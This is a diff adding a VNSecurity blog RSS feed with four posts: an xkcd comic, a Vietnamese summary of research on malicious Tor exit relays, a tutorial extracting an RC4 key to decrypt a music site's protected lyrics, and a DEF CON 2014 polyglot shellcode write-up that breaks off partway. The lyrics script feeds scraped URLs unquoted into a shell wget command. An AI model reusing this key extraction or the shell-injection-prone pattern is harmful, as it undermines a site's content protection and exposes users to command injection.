@@ -1,0 +1,1996 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>VNSecurity</title>
+    <description>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
+</description>
+    <link>http://localhost:8000/</link>
+    <atom:link href="http://localhost:8000/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Tue, 09 Dec 2014 23:35:39 +0800</pubDate>
+    <lastBuildDate>Tue, 09 Dec 2014 23:35:39 +0800</lastBuildDate>
+    <generator>Jekyll v2.5.2</generator>
+    
+      <item>
+        <title>Exploit of a Mom</title>
+        <description>&lt;p&gt;&lt;img class=&quot;alignnone&quot; src=&quot;http://imgs.xkcd.com/comics/exploits_of_a_mom.png &quot; alt=&quot;&quot; width=&quot;666&quot; height=&quot;205&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Mon, 20 Oct 2014 00:00:00 +0800</pubDate>
+        <link>http://localhost:8000/misc/2014/10/20/exploit-of-a-mom.html</link>
+        <guid isPermaLink="true">http://localhost:8000/misc/2014/10/20/exploit-of-a-mom.html</guid>
+        
+        
+        <category>misc</category>
+        
+      </item>
+    
+      <item>
+        <title>Tor &amp;#8211; Xác định các exit relay độc hại</title>
+        <description>&lt;p&gt;&lt;strong&gt;1. Mở đầu&lt;/strong&gt;&lt;br /&gt;
+Bài viết này là phần mô tả sơ lược và bình luận bài báo “Spoiled Onions: Exposing Malicious Tor Exit Relays”[1].&lt;br /&gt;
+Tor exit relay là nút cuối dùng trong hành trình vận chuyển của các gói tin trọng mạng Tor, gói tin từ đây sẽ đi đến địa chỉ thực sự cần đến. Nó được vận hành bởi các người dùng tình nguyện trọng mạng và có thể nói tổng lưu lượng qua các exit relay này khá lớn (cỡ 1GB/s). Theo thiết kế, thì các người dùng ở các exit relay này có thể quan sát và thay đổi nội dung của các dữ liệu trong mạng.&lt;/p&gt;
+
+&lt;p&gt;Trong bài báo này, tác giả đề xuất các phương pháp để nhận ra các exit relay nào đang chơi bẩn và ghi lại những hành động của chúng. Họ xây dựng hai khung chương trình để phát hiện hoạt động bất thường của các exit relay. Một để chủ động phát hiện các hành động như thay đổi nội dung dữ liệu (Man in the middle), một là phần thụ động, để điều tra các exit relay sử dụng phương thức nghe lén (traffic sniff) để ăn cắp dữ liệu. Các giải pháp của tác giả được hiện thực chú trọng đến tính nhanh và hiệu quả trong quá trình quét các exit relay.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;2. Khái quát hoạt động của mạng Tor&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;
+  &lt;img class=&quot;aligncenter&quot; src=&quot;https://lh5.googleusercontent.com/egeTOj-mT7_qWwI4Xf7KgME_Fj8MQG-ItYOu2MVslR7YV0ewpgIRn0AZzZwTvgvLDJEsN_BUBRAMOXbhIlh4H6pa8J7rQpg8Tlz6g5Efem02QRMHot07Z8BP4GuXuLmaAp1PMklJKjg&quot; alt=&quot;&quot; width=&quot;307px;&quot; height=&quot;201px;&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Hình trên là mô hình 3 nút của mạng Tor, dữ liệu từ một tor client bất kì bắt đầu hành trình trong mạng thì nó sẽ đi qua:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Nút đầu (Entry guard): Đây này là nút đầu tiên trong hành trình của dữ liệu trong mạng.&lt;/li&gt;
+  &lt;li&gt;Nút giữa (Middle relay): là các nút trung chuyển dữ liệu trong mạng.&lt;/li&gt;
+  &lt;li&gt;Nút thoát (Exit relay): nút cuối hành trình của dữ liệu trọng mạng, đây là nút bắt cầu mà từ đây dữ liệu sẽ ra khỏi mạng mã hóa của Tor và đi đến đích nằm trong phần còn lại của thế giới – Internet. Dữ liệu – nếu có thể- sẽ bị nghe lén hoặc thay đổi ở nút này.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;3. Giám sát các Tor exit relay:&lt;/strong&gt;&lt;br /&gt;
+Như đã nói ở trên, tác giả đã xây dựng hai khung chương trình nhằm giám sát các exit relay trong toàn bộ mạng Tor. Phần này chúng ta sẽ lần lượt đi qua quá trình thực hiện hai khung chương trình đó. Ngoài ra, tác giả có công bố mã nguồn của chúng ở đây[3].&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;3.1 exitmap:&lt;/strong&gt;&lt;br /&gt;
+Đây là khung chương trình thứ nhất tác giả hiện thực, nó sẽ giám sát chủ động các exit relay trong việc thay đổi nội dụng dữ liệu của người dùng trong mạng.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Thiết kế:&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;
+  &lt;img class=&quot;aligncenter&quot; src=&quot;https://lh6.googleusercontent.com/u4TKbpaxg4s49fl5bApAyo2GaPjVFroZMzW9zFlerwcTddFnOM7j6ZR6EHcIAvenrcPhZq6ubTV84zf_NecFOKYNiujLLZM0fS1rhSUc7ZhCeOsRsJAR_F4WQCgUGmLVJMn-LumXD0g&quot; alt=&quot;&quot; width=&quot;331px;&quot; height=&quot;216px;&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;exitmap chạy trên một máy đơn lẻ, được xây dựng dựa vào thư viện python Stem – một thư viện hiện thực các giao thức Tor. Tác giả dùng Stem để khởi tạo và đóng các kết nối vào mạng. Bên cạnh đó cần một Tor client đang chạy để lấy các thông tin về các nút để biết đâu là các exit relay đang trực tuyến.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Hoạt động:&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Đầu tiên, exitmap lấy toàn bộ các exit relay từ Tor client đang chạy. Thực hiện chọn ra một exit relay ngẫu nhiên để kiểm tra.&lt;/li&gt;
+  &lt;li&gt;Khởi tạo một vòng (circuit) dữ liệu trong mạng Tor với exit relay là nút được lấy ngẫu nhiên từ 1.&lt;/li&gt;
+  &lt;li&gt;Giao tiếp với Tor client để vận chuyển dữ liệu.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Nâng cao hiệu năng của thiết kế:&lt;/em&gt;&lt;/strong&gt;&lt;br /&gt;
+Với mô hình và hoạt động của hệ thống ở trên, dữ liệu từ exitmap vào mạng Tor và đi lòng vòng qua rất nhiều nút khác rồi mới đến exit relay chọn sẵn, nên hiệu năng không cao. Trong khi mục đích của việc kiểm tra này hoàn toàn không đòi hỏi tính ẩn danh của Tor mang lại, nên tác giả đã cải tiến thêm hệ thống như sau.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;
+  &lt;img class=&quot;aligncenter&quot; src=&quot;https://lh4.googleusercontent.com/KTsL1X9oYrbghyBPrjO-2k6CL2gf8eG8C9Lbbj_5GwdwQYJR5iJK0hDOPYeivadYFMCr_PL6rAjhbDHJ06H3H4kvf4i8EYpBDa35pqcBcU-RHcmplOfbPgtuKe-5d0r_XT5ccEOhGEw&quot; alt=&quot;&quot; width=&quot;302px;&quot; height=&quot;190px;&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Thay vì chạy lòng vòng trong mạng dẫn đến ảnh hưởng hiệu năng của việc kiểm tra, tác giả đề xuất mô hình: dữ liệu chỉ chạy qua một nút cố định rồi đi ngay đến exit relay.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Phần quét:&lt;/em&gt;&lt;/strong&gt;&lt;br /&gt;
+Dựa vào exitmap được xây dựng như trên, tác giả viết thêm các phần kiểm tra cho các giao thức như HTTPs, XMPP, IMAPs, SSH, phát hiện sslstrip và phân giải DNS giả tạo.&lt;br /&gt;
+&lt;em&gt;Các phần quét kiểm tra dựa trên các giao thức HTTPs, XMPP, IMAPs và SSH:&lt;/em&gt; đều được thực hiện thông qua việc kiểm tra chứng chỉ hợp lệ trả về khi dữ liệu đi qua mạng Tor. Một exit relay thực hiện MitM sẽ khiến cho chứng chỉ trả về không đúng như ý và từ đó phát hiện được hành vi MitM của exit relay đó.&lt;br /&gt;
+Hình dưới tác giả cung cấp một đoạn mã giả mô tả phần đã nói ở trên:&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;
+  &lt;img class=&quot;aligncenter&quot; src=&quot;https://lh5.googleusercontent.com/cAlohQ54Mm_7Xb-cHeI6SqXDZnFE9bnl_0dTbUv1j9Ikq94QQ9owdv9xNwVTESFEvze5pStzE406oXzMwAKWGRSAp5N0-pecfpYAIbNM7UbcPmHK18MXuhCwqpRclqtQD_RW&quot; alt=&quot;&quot; width=&quot;621px;&quot; height=&quot;224px;&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Sslstrip:&lt;/em&gt; Thay vì cố gắng quan sát dữ liệu đã được bảo vệ với kết nối TLS, kẻ tấn công sẽ cố gắng chuyển các đường dẫn từ https về http, từ đó dữ liệu được chuyển dưới dạng hoàn toàn minh bạch, và kẻ tấn công dễ dàng lấy cắp các dữ liệu chúng muốn. Để phát hiện việc “downgraded” này, phần quét sslstrip cố gắng phát hiện trong dữ liệu HTML các đường dẫn bị thay đổi từ HTTPS thành HTTP.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Phân giải DNS giả mạo&lt;/em&gt;: Địa chỉ DNS cũng có thể được các client gửi đến exit relay để phân giải, việc này dẫn đến phía exit relay có thể giả mạo việc phân giải đó. Một mặt, các exit relay trong quá khứ có thể bị thiết lập sai khi dùng các DNS bị cản lọc – ví dụ như ở một số ISP ở Trung Quốc, Việt Nam, và một số nước châu âu. exitmap cũng sẽ phát hiện các phân giải DNS giả tạo này.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;3.2 HoneyConnector:&lt;/strong&gt;&lt;br /&gt;
+Khung chương trình này được xây dựng để phát hiện thụ động một vài exit relay đang cố gắng quan sát dữ liệu (sniffing) của người dùng Tor. Việc quan sát các dữ liệu này hầu hết là trên các giao thức không được mã hóa như là FTP, IMAP.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Mô hình:&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;
+  &lt;img class=&quot;aligncenter&quot; src=&quot;https://lh3.googleusercontent.com/NEuvLRGQZi6NpPeR8VEFxIhyd10MEGjEKnkBlQPjXma6n3rzOI1H-siwNvK2WDN_BJuVnKVy_KvXbDwfPvJzL-01COmODQLcuz7yoctqdkDDjdLA4OMkjwyaw5R1PlUCiGOt&quot; alt=&quot;&quot; width=&quot;576px;&quot; height=&quot;296px;&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Khung chương trình này hoạt động như sau:&lt;/em&gt;&lt;/strong&gt;&lt;br /&gt;
+Từ Tor client liên tục gửi đi các yêu cầu login đến “Destination Server” là các FTP/IMAP server với các thông tin đăng nhập user/pass được tạo sẵn, đồng thời gửi các thông tin đó đến server đích.&lt;br /&gt;
+Các thông tin đăng nhập trên được lưu trong database, bao gồm đã được gửi qua exit relay nào. Trong thời gian theo dõi (hàng tháng), nếu một thông tin đăng nhập nào đó được dùng để đăng nhập vào các FTP/IMAP server trên thì sẽ bị lưu lại và đối chiếu với thông tin trong cơ sở dữ liệu, tìm ra được exit relay nào đã tiến hành lấy cắp dữ liệu.&lt;/p&gt;
+
+&lt;p&gt;Phần còn lại của bài báo là các thông tin rút ra được từ kết quả kiểm tra của tác giả trong nhiều tháng liền. Trong phần đúc kết thông tin này, có nhiều thông tin rất thú vị, ví dụ như về một số nhóm chuyên đi lợi dụng các exit relay để sniffing, chèn thêm mã độc vào trang html, … Hình dưới liệt kê 40 exit relay mà tác giả đã kiểm tra được có hành vi nguy hiểm:&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;
+  &lt;img class=&quot;aligncenter&quot; src=&quot;https://lh5.googleusercontent.com/PN1ExhdM9z2CpzWbXfuSniUs_JV_fyvazqjQmyh5vXCsvlrEa1tS0XQ-4Fu20TIVjhRudYbmpLxI6Yh3Qa9PP67W06ypZYNlBupIHA7eOkNIsUJ_6v81cuwMsAT2WUYgY38U&quot; alt=&quot;C:A31D5665347F1D4E-A7C2-4647-96EF-468158E00942_filesimage006.png&quot; width=&quot;551px;&quot; height=&quot;671px;&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Và các exit relay đã nghe lén để ăn cắp thông tin (đăng nhập) của người dùng Tor:&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;
+  &lt;img class=&quot;aligncenter&quot; src=&quot;https://lh6.googleusercontent.com/TyO3KqIdmwZHVSp4e3lfpf570_CXC1z552vgEJFDgl-y6aJQ8UEwkoIKlO964hR5UzAkumblEDPBtN-L4kMQA_zrYv4WZQr6eys8ST3kT-QDPD1C5lmyePRIppFnmxcaZpbo&quot; alt=&quot;C:A31D5665347F1D4E-A7C2-4647-96EF-468158E00942_filesimage007.png&quot; width=&quot;584px;&quot; height=&quot;466px;&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Các bạn đọc thêm ở tài liệu trong phần 4, các phần phân tích kết quả còn lại.&lt;/p&gt;
+
+&lt;p&gt;Phần còn lại trong bài báo là các phát triển thêm của tác giả cho trình duyệt Tor browser, để có thể phòng ngừa nếu một exit relay nào đó đang MitM, mà không hiểu gì về trang cảnh báo của trình duyệt. Thay vì để trình duyệt hiện cảnh báo thì Tor sẽ tự xác minh và từ bỏ ngay exit relay đang MitM đó. Các bạn đọc thêm trong phần 6 của bài báo.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;4. Tổng kết&lt;/strong&gt;&lt;br /&gt;
+Vậy dùng tor có an toàn không? Dù rằng bài báo đã cho thấy rằng có khả năng bị tấn công khi sử dụng Tor, tuy nhiên các tấn công này hoàn toàn là phòng ngừa được nếu như người dùng tôn trọng các nguyên tắc bảo mật (trong trường hợp bị MitM), và không dùng các giao thức cũ để đăng nhập (FTP/IMAP) để có thể dễ dàng bị đánh cắp dữ liệu.&lt;br /&gt;
+Gần đây cũng có một nghiên cứu về Tor nữa, nhưng đã bị hủy bỏ trước khi trình bày ở hội nghị Blackhat USA. Nghiên cứu này về vấn đề nặc danh của Tor. [2]&lt;br /&gt;
+Quay lại với bài báo, có cách nào có thể qua mặt được các kiểm tra như bài báo đã làm hay không. Và có cách nào để có thể ứng dụng vào Tor để phát hiện ngay tức thì các hành động gây hại ở exit relay và loại bỏ nó ra khỏi mạng. Mong các bạn thảo luận thêm &lt;img src=&quot;http://vnsec-new.cloudapp.net/wp/wp-includes/images/smilies/icon_smile.gif&quot; alt=&quot;:)&quot; class=&quot;wp-smiley&quot; /&gt; &lt;/p&gt;
+
+&lt;p&gt;Tham khảo:&lt;/p&gt;
+
+&lt;p&gt;[1] https://petsymposium.org/2014/papers/Winter.pdf&lt;br /&gt;
+[2] http://freedomhacker.net/tor-project-fixing-vulnerability-that-could-expose-users/&lt;br /&gt;
+[3] http://www.cs.kau.se/philwint/spoiled_onions/&lt;/p&gt;
+</description>
+        <pubDate>Thu, 14 Aug 2014 00:00:00 +0800</pubDate>
+        <link>http://localhost:8000/tutorials/2014/08/14/tor-xac-dinh-cac-exit-relay-doc-hai.html</link>
+        <guid isPermaLink="true">http://localhost:8000/tutorials/2014/08/14/tor-xac-dinh-cac-exit-relay-doc-hai.html</guid>
+        
+        <category>exit relay</category>
+        
+        <category>read paper</category>
+        
+        <category>tor</category>
+        
+        
+        <category>tutorials</category>
+        
+      </item>
+    
+      <item>
+        <title>Lấy lời nhạc nhaccuatui.com</title>
+        <description>&lt;p&gt;Nhaccuatui vừa nâng cấp trình chơi nhạc trên web của mình có thể hiển thị lời nhạc theo thời gian khá tốt. Bài viết này sẽ trình bày các bước để lấy lời nhạc đó và cung cấp một công cụ để thực hiện trong 1 cú enter &lt;img src=&quot;http://vnsec-new.cloudapp.net/wp/wp-includes/images/smilies/icon_wink.gif&quot; alt=&quot;;)&quot; class=&quot;wp-smiley&quot; /&gt; (*).&lt;/p&gt;
+
+&lt;p&gt;Lấy một bài nhạc làm mẫu như bài &lt;a href=&quot;http://www.nhaccuatui.com/bai-hat/loi-to-tinh-ong-buom-vu-hung.d1rchpsGUBfW.html&quot;&gt;này&lt;/a&gt;. Lời nhạc được hiện rất khớp với nhạc:&lt;/p&gt;
+
+&lt;div id=&quot;attachment_1752&quot; style=&quot;width: 405px&quot; class=&quot;wp-caption aligncenter&quot;&gt;
+  &lt;img class=&quot;size-full wp-image-1752&quot; src=&quot;http://www.vnsecurity.net/wp/storage/uploads/2014/08/nctlyricshow.png&quot; alt=&quot;nctlyricshow&quot; width=&quot;395&quot; height=&quot;133&quot; /&gt;&lt;p class=&quot;wp-caption-text&quot;&gt;
+    nctlyricshow
+  &lt;/p&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Đơn giản, xem mã nguồn của trang thử lời nhạc này lấy từ đâu:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.vnsecurity.net/2014/08/nhaccuatui-lyrics/htmlsourcecode/&quot; rel=&quot;attachment wp-att-1753&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-1753&quot; src=&quot;http://www.vnsecurity.net/wp/storage/uploads/2014/08/htmlsourcecode.png&quot; alt=&quot;htmlsourcecode&quot; width=&quot;1352&quot; height=&quot;133&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Đúng là khúc này, đường dẫn &lt;a href=&quot;https://www.vnsecurity.net/2014/08/nhaccuatui-lyrics/linkdescription/&quot; rel=&quot;attachment wp-att-1754&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-1754&quot; src=&quot;http://www.vnsecurity.net/wp/storage/uploads/2014/08/linkdescription.png&quot; alt=&quot;linkdescription&quot; width=&quot;548&quot; height=&quot;17&quot; /&gt;&lt;/a&gt; là một mô tả cho bài nhạc ở trên, có chứa các thông tin của bài nhạc, bao gồm cả đường dẫn đến tệp lời nhạc:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.vnsecurity.net/2014/08/nhaccuatui-lyrics/songdescription/&quot; rel=&quot;attachment wp-att-1761&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-1761&quot; src=&quot;http://www.vnsecurity.net/wp/storage/uploads/2014/08/songdescription.png&quot; alt=&quot;songdescription&quot; width=&quot;1138&quot; height=&quot;399&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Tải tệp Loi-To-Tinh-Ong-Buom-Vu-Hung.lrc (**) về, nhưng có một vấn đề, nó đã bị mã hóa thành như thế này:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.vnsecurity.net/2014/08/nhaccuatui-lyrics/lyricencrypted/&quot; rel=&quot;attachment wp-att-1762&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-1762&quot; src=&quot;http://www.vnsecurity.net/wp/storage/uploads/2014/08/lyricencrypted.png&quot; alt=&quot;lyricencrypted&quot; width=&quot;1901&quot; height=&quot;281&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Làm thế nào đây, rỏ ràng là chương trình nghe nhạc của nhaccuatui hiển thị lời nhạc rất rỏ ràng. Bây giờ, phải tìm hiểu chương trình nghe nhạc này xử lý tệp tin lrc kia như thế nào. Decompile chương trình nghe nhạc của nhaccuatui bằng tiện ích ở đây http://www.showmycode.com/. Duyệt qua một chút mã nguồn thì sẽ thấy đoạn code này:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.vnsecurity.net/2014/08/nhaccuatui-lyrics/lrcdecrypt/&quot; rel=&quot;attachment wp-att-1763&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-1763&quot; src=&quot;http://www.vnsecurity.net/wp/storage/uploads/2014/08/lrcdecrypt.png&quot; alt=&quot;lrcdecrypt&quot; width=&quot;598&quot; height=&quot;90&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Ở dưới là phần xử lý biến local5 để làm lời nhạc, từ đó ta có thể suy ra rằng tệp lrc kia đã được mã hóa bằng RC4, với khóa là đoạn:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: php; title: ; notranslate&quot; title=&quot;&quot;&gt;var _local3:ByteArray = Hex.toArray(Hex.fromString(irrcrpt('Mzs2dkvtu5odu', 1)));&lt;/pre&gt;
+
+&lt;p&gt;Chương trình chơi nhạc của nhaccuatui sử dụng **irrFuscator **để làm rối mã nguồn action script. Nhưng có một công cụ online để decrypt các chuỗi dùng irrFuscator này tại http://peniscorp.com/boombang/decrypt.php , dán đoạn code trên vào và ta sẽ có:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: css; title: ; notranslate&quot; title=&quot;&quot;&gt;var _local3:ByteArray = Hex.toArray(Hex.fromString('Lyr1cjust4nct'));&lt;/pre&gt;
+
+&lt;p&gt;Vậy là ta đã có ciphertext là tệp lrc, phương thức mã hóa là &lt;strong&gt;RC4 **với khóa là **Lyr1cjust4nct&lt;/strong&gt;, công việc còn lại là giải mã tệp đó. Có thể dùng công cụ có sẵn trên mạng như: http://rc4.online-domain-tools.com/.&lt;/p&gt;
+
+&lt;p&gt;Phía dưới là mã nguồn mình viết để đơn giản hóa việc lấy lời nhạc này:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: css; title: ; notranslate&quot; title=&quot;&quot;&gt;import re
+import httplib
+import os
+import sys
+
+def rc4crypt(data, key):
+    x = 0
+    box = range(256)
+    for i in range(256):
+        x = (x + box[i] + ord(key[i % len(key)])) % 256
+        box[i], box[x] = box[x], box[i]
+    x = 0
+    y = 0
+    out = []
+    for char in data:
+        x = (x + 1) % 256
+        y = (y + box[x]) % 256
+        box[x], box[y] = box[y], box[x]
+        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))
+
+    return ''.join(out)
+
+if len(sys.argv) &amp;amp;lt;= 2:
+    print 'usage: python nctlyricdecryptor.py /bai-hat/loi-to-tinh-ong-buom-vu-hung.d1rchpsGUBfW.html'
+    exit()
+
+conn = httplib.HTTPConnection('www.nhaccuatui.com')
+conn.request('GET', sys.argv[1])
+r1 = conn.getresponse()
+data1 = r1.read()
+songdescript = 'http://www.nhaccuatui.com/flash/xml?key1=' + re.search('([a-fA-Fd]{32})', data1).group(0)
+
+conn.request('GET', songdescript)
+r1 = conn.getresponse()
+data1 = r1.read()
+m = re.search('http://lrc.nct.nixcdn.com/(.*)]', data1).group(0)[:-2]
+print m
+os.system('wget ' + m + ' -O lyric')
+lyricencrypted = open('lyric').readline()
+
+lyricdecrypted = rc4crypt(lyricencrypted.decode('hex'), 'Lyr1cjust4nct')
+
+f = open('lyric', 'wb')
+f.write(lyricdecrypted)
+f.close()&lt;/pre&gt;
+
+&lt;p&gt;&lt;em&gt;(&lt;/em&gt;): Các bạn chịu hoàn toàn trách nhiệm trước pháp luật khi dùng chương trình này để lấy dữ liệu từ trang nhaccuatui.*&lt;br /&gt;
+&lt;em&gt;(**) http://en.wikipedia.org/wiki/LRC_(file_format)&lt;/em&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Sun, 03 Aug 2014 00:00:00 +0800</pubDate>
+        <link>http://localhost:8000/tutorials/2014/08/03/nhaccuatui-lyrics.html</link>
+        <guid isPermaLink="true">http://localhost:8000/tutorials/2014/08/03/nhaccuatui-lyrics.html</guid>
+        
+        
+        <category>tutorials</category>
+        
+      </item>
+    
+      <item>
+        <title>[defcon 2014 quals] polyglot</title>
+        <description>&lt;p&gt;Challenge was getting 0×1000 bytes from socket, and executing it following these rules (all shellcodes and codes are at the end of this writeup):&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;- all general purpose registers are 0
+- stack is at 0x42000000
+- pc    is at 0x41000000
+
+&lt;/pre&gt;
+
+&lt;p&gt;All binaries:&lt;br /&gt;
+&lt;strong&gt;x86&lt;/strong&gt; : &lt;a href=&quot;http://deroko.phearless.org/polyglot/polyglot_9d64fa98df6ee55e1a5baf0a170d3367&quot;&gt;polyglot_9d64fa98df6ee55e1a5baf0a170d3367&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;armel&lt;/strong&gt; : &lt;a href=&quot;http://deroko.phearless.org/polyglot/polyglot_6a3875ce36a55889427542903cd43893&quot;&gt;polyglot_6a3875ce36a55889427542903cd43893&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;armeb&lt;/strong&gt; : &lt;a href=&quot;http://deroko.phearless.org/polyglot/polyglot_c0e7a26d7ce539efbecc970c154de844&quot;&gt;polyglot_c0e7a26d7ce539efbecc970c154de844&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;PowerPC&lt;/strong&gt;: &lt;a href=&quot;http://deroko.phearless.org/polyglot/polyglot_5b78585342a3c116aebb5a9b45e88836&quot;&gt;polyglot_5b78585342a3c116aebb5a9b45e88836&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Our shellcode should read /flag and output it to stdout&lt;/strong&gt;. Very simple? I thought that there is some filtering for shellcode, but that didn’t happen. Only problem I’ve encountered was with size of send buffer. Don’t know why, but seemed that my system wasn’t sending all 0×1000 bytes in one run, which gave me some headache latter on. First shellcode to execute is x86. You may see this by connecting to the server, and it will grant you with this message (after we send password to the server given to us by organizer: &lt;strong&gt;w0rk_tHaT_tAlEnTeD_t0nGu3&lt;/strong&gt;).&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;----------------------------
+Give me shellcode.  You have up to 0x1000 bytes.  All GPRs are 0.  PC is 0x41000000.  SP is 0x42000000.
+
+Throwing shellcode against linux26-x86.(http://services.2014.shallweplayaga.me/polyglot_9d64fa98df6ee55e1a5baf0a170d3367)
+----------------------------
+
+&lt;/pre&gt;
+
+&lt;p&gt;This was quite simple.&lt;/p&gt;
+
+&lt;p&gt;Next one on the line was &lt;strong&gt;armel&lt;/strong&gt;, so our shellcode has to be compatible with &lt;strong&gt;x86&lt;/strong&gt; and &lt;strong&gt;armel&lt;/strong&gt;. Simple, we just find B instruction and branch over x86 shellcode. For writing this shellcode I used &lt;strong&gt;raspbian&lt;/strong&gt; in &lt;strong&gt;qemu&lt;/strong&gt;. Once this shellcode was executed, next one was &lt;strong&gt;armeb&lt;/strong&gt;, eg. same shell code but differently stored in a big endian. Now comes funny part, finding 2 instructions which are do nothing for armel and B for armeb and vice verse. For this purpose I’ve experimented with branch instructions and after a bit found good combination:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;dd      0xEB0000E0
+       dd      0xE00000EB
+
+&lt;/pre&gt;
+
+&lt;p&gt;Which, tnx to capstone comes to be:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;0x00000000: bl #0x380
+0x00000004: and r0, r0, fp, ror #1
+
+&lt;/pre&gt;
+
+&lt;p&gt;Very good, at this offset I had:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;ldr    pc, [pc, #4]        &amp;lt;--- for  armel
+      ldr    pc, [pc, #4]        &amp;lt;--- form armeb
+      dd    address_of_armel_shellcode
+      dd    address_of_armeb_shellcode
+
+&lt;/pre&gt;
+
+&lt;p&gt;Here I figured that my shellcode doesn’t get transfered as a whole, as my original first ARM instructions were going to 0x41000Fxx where I had LDR PC, [PC, #4]. Also while playing with ARM instructions in IDA, I’ve noticed that IDA showed some ARM &lt;strong&gt;BEQ&lt;/strong&gt; instructions as &lt;strong&gt;B&lt;/strong&gt; which was wrong. From this point on I’ve used only &lt;strong&gt;capstone&lt;/strong&gt; as this beq/b wrong translation in IDA gave me also some headache.&lt;/p&gt;
+
+&lt;p&gt;Now comes 4th stage, and that was the ugliest one: &lt;strong&gt;PowerPC&lt;/strong&gt; . I try to avoid any possible shellcode in the wild, and prefer to write my own always. For this, due to whatever reason qemu which comes with ubuntu 14.04 couldn’t run PowerPC image which I’ve located here:&lt;br /&gt;
+&lt;a href=&quot;http://people.debian.org/~aurel32/qemu/powerpc/&quot;&gt;http://people.debian.org/~aurel32/qemu/powerpc/&lt;/a&gt; (you can also get armel and amrhf from this link)&lt;/p&gt;
+
+&lt;p&gt;No problem, downloaded qemu 2.0.0 and recompiled and it worked. Time to start writing my code. Of course, gdb is very very useless without any hookstop, so for this purpose I wrote simple  .gdbinit to help me develop this shellcode:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;define hook-stop
+        printf &quot;---------------------------------------------------------------n&quot;
+        printf &quot;r0 : 0x%.08X r1 : 0x%.08X r2 : 0x%.08X r3 : 0x%.08Xn&quot;, $r0, $r1, $r2, $r3
+        printf &quot;r4 : 0x%.08X r5 : 0x%.08X r6 : 0x%.08X r7 : 0x%.08Xn&quot;, $r4, $r5, $r6, $r7
+        printf &quot;---------------------------------------------------------------n&quot;
+        x/10i   $pc
+end
+
+&lt;/pre&gt;
+
+&lt;p&gt;We are ready to go with simple test. One thing about PowerPC syntax is that registers in assembly are represented as 0-31, so it’s sometimes hard to make difference and notice errors, which puzzled  me a lot. Here is PowerPC code&lt;br /&gt;
